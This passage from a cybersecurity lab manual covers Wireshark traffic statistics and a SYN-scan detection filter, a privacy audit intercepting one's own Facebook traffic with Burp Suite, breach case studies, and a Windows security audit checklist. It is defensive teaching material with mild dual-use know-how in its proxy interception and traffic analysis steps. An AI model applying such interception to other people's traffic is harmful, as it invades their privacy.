   - IPs generating abnormally high traffic volumes.
5. Close the window.

---

## Step 12 — Statistics — Resolved Addresses

1. Go to **"Statistics"** → **"Resolved Addresses"**.
2. A list of all IP addresses resolved to domain names during capture.
3. This shows what websites/servers your system contacted.

---

## Step 13 — Statistics — Packet Lengths

1. Go to **"Statistics"** → **"Packet Lengths"**.
2. A graph shows the distribution of packet sizes.
3. **What to look for:**
   - Many tiny packets (40–80 bytes) = could be a SYN scan or DoS attempt.
   - Very large packets = data transfers.

---

## Step 14 — Statistics — I/O Graph

1. Go to **"Statistics"** → **"I/O Graph"**.
2. A graph appears showing **packets per second over time**.
3. The X axis = time, Y axis = packets/second.
4. **What to look for:**
   - A sudden spike in traffic = possible attack or data exfiltration.
   - Flat baseline with one big spike = suspicious event.
5. You can add custom filters to the graph lines — for example, add a line for only `http` traffic.

---

## 📊 Network Forensics — Complete Analysis Checklist

| Analysis Task | Menu Path | What You Find |
|--------------|-----------|---------------|
| Protocol breakdown | Statistics → Protocol Hierarchy | What protocols are in the traffic |
| All connections | Statistics → Conversations | Who talked to whom |
| All IP addresses | Statistics → Endpoints | Every IP seen in capture |
| Domain names | Statistics → Resolved Addresses | What websites were visited |
| Packet size distribution | Statistics → Packet Lengths | Size patterns of traffic |
| Traffic over time | Statistics → I/O Graph | Traffic volume spikes |
| File metadata | Statistics → Capture File Properties | Capture duration, total packets |
| Port scan detection | Filter: `tcp.flags.syn==1 && tcp.flags.ack==0` | Scanning activity |
| HTTP content | Filter: `http` then follow TCP stream | Web requests in plain text |
| Encrypted traffic | Filter: `tls` | HTTPS traffic (content not readable) |

---

## Conclusion

Network forensics analysis was successfully performed using Wireshark. Protocol analysis, TCP stream following, suspicious traffic identification using SYN scan detection, and comprehensive statistics (Protocol Hierarchy, Conversations, Endpoints, I/O Graph, Packet Lengths) were all demonstrated. Network forensics is a critical skill for incident response and threat detection.

---

---

# Experiment 13: Privacy Audit of Apps & Data Breach Case Study

**Aim:** Analyse privacy, network behaviour, and security risks of WhatsApp and Facebook using Wireshark and Burp Suite, and study real-world data breach cases.

**Platform:** Kali Linux + Windows | **Tools:** Nativefier, Wireshark, Burp Suite, Exodus Privacy, HaveIBeenPwned

---

## PART A — Setting Up WhatsApp Desktop App

### Step 1 — Install Node.js and npm

1. Open Kali Terminal. Type:
   ```
   sudo apt update
   ```
   *(Type password `kali`, press Enter.)*
2. Install Node.js:
   ```
   sudo apt install nodejs npm -y
   ```

### Step 2 — Install Nativefier

1. Type:
   ```
   sudo npm install -g nativefier
   ```
2. Wait for "added X packages" message.

### Step 3 — Create and Launch WhatsApp Desktop App

1. Type:
   ```
   nativefier https://web.whatsapp.com
   ```
2. Wait for build to finish — says `App built to /home/kali/WhatsAppWeb-linux-x64`.
3. Run it:
   ```
   cd WhatsAppWeb-linux-x64
   ./WhatsAppWeb
   ```
4. A WhatsApp QR code window appears.

### Step 4 — Log Into WhatsApp

1. On your **mobile phone**, open WhatsApp.
2. Tap the **three dots** → **"Linked Devices"** → **"Link a Device"**.
3. Point your phone camera at the QR code on screen.
4. WhatsApp loads on Kali Linux showing your chats. ✅

---

## PART B — Analyze WhatsApp Trackers (Exodus Privacy)

### Step 5 — Check WhatsApp Trackers

1. Open **Firefox** → go to: `https://reports.exodus-privacy.eu.org`
2. Search for `WhatsApp`.
3. Click the WhatsApp result.
4. Note:
   - Number of **trackers** (e.g., Google Analytics, Crashlytics, Facebook Analytics)
   - Number of **permissions** the app requests
5. Record these numbers in your lab book.

---

## PART C — Capture WhatsApp Traffic with Wireshark

### Step 6 — Open Wireshark and Start Capture

1. In terminal type: `wireshark &`
2. Select **eth0** interface → click blue shark fin to start capture.

### Step 7 — Generate WhatsApp Traffic

1. Switch to WhatsApp window.
2. Click a chat → type a message → press Enter.
3. Send an image using the attachment icon.
4. Scroll through messages.

### Step 8 — Apply Filters and Observe

1. In Wireshark filter bar, type `tls` → press Enter.
2. TLS (encrypted) packets to/from WhatsApp servers appear.
3. **Observation:** Message content is NOT visible — WhatsApp uses End-to-End Encryption. ✅

4. Change filter to `dns` → press Enter.
5. You can see DNS queries — domains WhatsApp contacts:
   - `whatsapp.net`
   - `facebook.com`

**Key Finding:** Even though message content is encrypted, **metadata** (IP addresses, domains, timing of messages) is visible in network traffic.

---

## PART D — Audit Facebook Using Burp Suite

### Step 9 — Open and Configure Burp Suite

1. In Kali: Applications → search **"Burp Suite"** → open it.
2. Click **"Temporary project"** → **"Next"** → **"Use Burp defaults"** → **"Start Burp"**.
3. **Proxy** tab → **Proxy settings** → listener `127.0.0.1:8080` is already configured.

### Step 10 — Configure Firefox to Use Burp as Proxy

1. In Firefox: click the **three horizontal lines** (≡) → **"Settings"**.
2. Scroll to the bottom → click **"Settings"** next to "Network Settings".
3. Select **"Manual proxy configuration"**.
4. HTTP Proxy: `127.0.0.1` | Port: `8080`
5. Check **"Also use this proxy for HTTPS"**.
6. Click **"OK"**.

### Step 11 — Intercept Facebook Traffic

1. In Burp Suite: **Proxy** → **Intercept** → click button to say **"Intercept is on"**.
2. In Firefox: go to `https://www.facebook.com`
3. Firefox pauses — Burp is intercepting.
4. In Burp, click **"Forward"** button repeatedly until Facebook loads.
5. Log in to Facebook using a test account.

### Step 12 — Observe Tracking Behaviour

1. Turn off intercept: click button to say **"Intercept is off"**.
2. Browse Facebook — click posts, scroll, click ads.
3. In Burp: **Proxy** → **HTTP history**.
4. Dozens of requests appear — look for:
   - **"datr"** or **"fr"** in URLs — Facebook tracking cookies.
   - Requests to third-party domains (analytics, ad networks).
   - Session IDs in request headers.

### Step 13 — Use Browser Developer Tools

1. On the Facebook page, press **F12**.
2. Click the **"Network"** tab → reload with **F5**.
3. You see ALL network requests Facebook makes, including to:
   - `connect.facebook.net`
   - `pixel.facebook.com`
   - Analytics and ad-tracking scripts.

---

## PART E — Data Breach Case Studies

### Case Study 1: Facebook Data Breach (2021)

| Detail | Info |
|--------|------|
| Users Affected | 533 million worldwide |
| Data Leaked | Phone numbers, email addresses, names, birthdates |
| Root Cause | API vulnerability allowed mass scraping |
| Impact | Users received targeted phishing/spam calls |

### Case Study 2: WhatsApp — Pegasus Spyware Attack

| Detail | Info |
|--------|------|
| Attack Method | Zero-click exploit via missed WhatsApp call |
| Effect | Full remote access to device (microphone, camera, messages) |
| User Action Required | None — victim didn't need to answer the call |
| Target | Journalists, activists, politicians worldwide |

### Step 14 — Check if Your Email Was in a Data Breach

1. In Firefox, go to: `https://haveibeenpwned.com`
2. Type an email address in the search box.
3. Click **"pwned?"** button.
4. Results show which data breaches (if any) that email appeared in.
5. Example result: "Oh no — pwned! Found in 3 data breaches" or "Good news — no pwnage found!"

---

## Result

Privacy audit successfully performed. WhatsApp ensures secure communication through end-to-end encryption (message content not visible). Facebook shows extensive tracking via cookies and third-party scripts. Data breach case studies highlight risks of API vulnerabilities and zero-click exploits.

---

---

# Experiment 14: Security Audit and Risk Assessment on Windows

**Aim:** Perform a security audit on a Windows system, identify potential vulnerabilities, and suggest mitigation strategies.

**Platform:** Windows | **Tools:** Built-in Windows tools (no Kali Linux needed)

---

## Step 1 — Check System Information

1. Press `Windows key + R` simultaneously.
2. Type `msinfo32` → press **Enter**.
3. The System Information window opens.
4. Note down:
   - **OS Name** (e.g., Microsoft Windows 11 Home)
   - **System Type** (e.g., x64-based PC)
   - **Processor** name
   - **BIOS Mode** → should say **"UEFI"** for modern secure systems
   - **Secure Boot State** → should say **"On"** ✅
5. Close the window.

> **What to look for:** Secure Boot = On means the system is protected from unauthorized boot software.

---

## Step 2 — Check Windows Updates

1. Click the **Start button** → click the **gear icon ⚙️** (Settings).
2. Click **"Windows Update"** (left panel).
3. Click **"Check for updates"** button.
4. Windows checks for available updates.
5. Note whether updates are **available** or the system is **"You're up to date"**.

> **What to look for:** Any pending updates = unpatched vulnerabilities. These should be installed immediately.

---

## Step 3 — Check Firewall Status

1. Click **Start** → type `Windows Defender Firewall` → press **Enter**.
2. The Firewall window opens.
3. You see two sections:
   - **Private networks** — should show a green shield ✅ (active)
   - **Guest or public networks** — should show a green shield ✅ (active)
4. If you see a red X on either — the firewall is OFF and the system is at risk.
5. Look for any message like "Managed by Kaspersky" — still fine.

> **What to look for:** Firewall should be active on ALL network types.

---

## Step 4 — Check Antivirus Status

1. Click **Start** → type `Windows Security` → press **Enter**.
2. Click **"Virus & threat protection"** (shield icon).
3. Look at:
   - **Current threats** — should say "No current threats" ✅
   - **Protection settings** — should say "No actions needed" ✅
   - **Protection updates** — should say "No actions needed" ✅
   - The antivirus name (e.g., Kaspersky or Windows Defender) — confirms it is active.

> **What to look for:** If real-time protection is OFF → system is vulnerable to malware.

---

## Step 5 — Check Password and Account Security

1. Click **Start** → gear icon (Settings) → **"Accounts"** (left panel).
2. Click **"Sign-in options"**.
3. Check which methods are configured:
   - **Facial recognition / Fingerprint** — advanced security ✅
   - **PIN (Windows Hello)** — should say "Added" ✅
   - **Password** — should be set ✅

> **What to look for:** At minimum, a PIN or Password must be set. No sign-in method = anyone can access.

---

## Step 6 — Check Installed Applications

1. Click **Start** → Settings → **"Apps"** → **"Installed apps"**.
2. A list of all installed software appears.
3. Scroll through carefully. Look for:
   - Software you don't recognize.
   - Cracked or pirated tools (often contain malware).
   - Outdated software with very old installation dates.

> **What to look for:** Unknown or unauthorized software should be investigated and removed.

---

## Step 7 — Check Startup Programs

1. Press `Ctrl + Shift + Esc` all at once → **Task Manager** opens.
2. Click the **"Startup apps"** tab.
3. A list of programs that run automatically when Windows starts.
4. For each item, check:
   - **Status** (Enabled/Disabled)
   - **Startup impact** (High/Medium/Low/None)
   - **Publisher** — unknown publishers are suspicious.
5. To disable a suspicious app: right-click it → click **"Disable"**.

> **What to look for:** Unnecessary or unknown startup programs increase attack surface.

---

## Step 8 — Check Network Security

1. Click **Start** → Settings → **"Network & Internet"**.
2. Click on your **Wi-Fi network name**.
3. Look at **"Network profile type"**:
   - **Public network** — more secure ✅
   - **Private network** — use only on trusted home networks.
4. Note the network name and profile type.

> **What to look for:** On college/public networks, always use "Public" profile.

---

## Step 9 — Check Browser Security Settings

1. Open **Google Chrome**.
2. Click the **three dots** (⋮) at top-right → **"Settings"**.
3. Click **"Privacy and security"** (left panel) → **"Security"**.
4. Under **"Safe Browsing"**, check which option is selected:
   - **Enhanced protection** — best ✅✅
   - **Standard protection** — good ✅
   - **No protection** — dangerous ❌
5. Make sure at least Standard protection is selected.

---

## Step 10 — Check Data Backup Status

1. Click **Start** → Settings → search `Backup` inside Settings → click **"Windows backup settings"**.
2. You will see:
   - **OneDrive** sync status
   - **App list** backup
   - **Preferences** backup
3. If OneDrive shows "Not syncing" — backup is NOT configured.
4. Green checkmarks = backup properly set up. ✅

> **What to look for:** No backup = high risk of data loss from ransomware or hardware failure.

---

## Step 11 — Risk Assessment Summary Table

Fill this in based on your observations during the audit:

| Asset | Threat | Vulnerability Found | Risk Level | Recommended Solution |
|-------|--------|--------------------|-----------|--------------------|
| Personal Files | Ransomware / Data Loss | OneDrive backup not configured | **High** | Enable OneDrive sync immediately |
| Operating System | Malware / Exploits | Pending Windows updates found | **High** | Install all updates immediately |
| Network | Eavesdropping / Hacking | Connected to public network as Private | **Medium** | Switch to Public profile on untrusted networks |
| User Account | Unauthorized Access | No PIN or weak password set | **High** | Set a strong PIN (minimum 8 digits) |
| Applications | Malware infection | Unknown startup programs found | **Medium** | Disable unknown startup apps |
| Browser | Phishing / Malware | Safe Browsing set to None | **High** | Enable Standard/Enhanced Safe Browsing |
| Antivirus | Malware attack | Real-time protection disabled | **Critical** | Re-enable antivirus immediately |

---

## Step 12 — Security Recommendations

### ✅ Technical Controls
- Enable Windows Defender Firewall on all network types.
- Keep antivirus (Kaspersky/Defender) active and updated.
- Install all pending Windows Updates regularly.
- Enable OneDrive or external drive backup.

### ✅ Administrative Controls
- Use strong passwords (min 12 characters — mix of letters, numbers, symbols).
- Enable Windows Hello PIN or fingerprint.
- Disable unnecessary startup applications.

### ✅ User Awareness
- Never click suspicious email links.
- Avoid downloading cracked/pirated software.
- Always use Safe Browsing in Chrome/Edge.
- Lock your PC when stepping away: press `Windows key + L`.

---

## Result

The Windows security audit successfully identified potential vulnerabilities including missing backups, pending updates, and startup program risks. Mitigation strategies including enabling backup, updating software, and strengthening authentication were identified and documented.

---

---

## 📝 General Tips for All Experiments

| Situation | What to Do |
|-----------|-----------|
| Terminal command not found | Check your typing — Linux commands are case-sensitive |
| DVWA not loading | Make sure you ran `sudo service apache2 start` AND `sudo service mysql start` first |
| Emulator very slow | Give it 3–5 minutes to fully load; do not click repeatedly |
| Burp Suite not intercepting | Check "All interfaces" is selected AND "Intercept is on" |
| `sudo` asks for password | Type `kali` and press Enter (nothing shows while typing — normal) |
| Kali Linux frozen | Right-click desktop → Open Terminal → try the command again |
| ADB device not found | Make sure the emulator is fully booted before running ADB commands |
| Browser shows proxy error | Confirm Burp Suite is open and running before browsing |
| Wireshark shows no packets | Make sure you selected the correct interface (eth0) before starting |
| Python script error | Check that you installed required libraries with `pip install` |
| Firewall rule not created | Make sure Command Prompt was opened as Administrator |
| Autopsy not starting | Make sure you typed `sudo autopsy` not just `autopsy` |
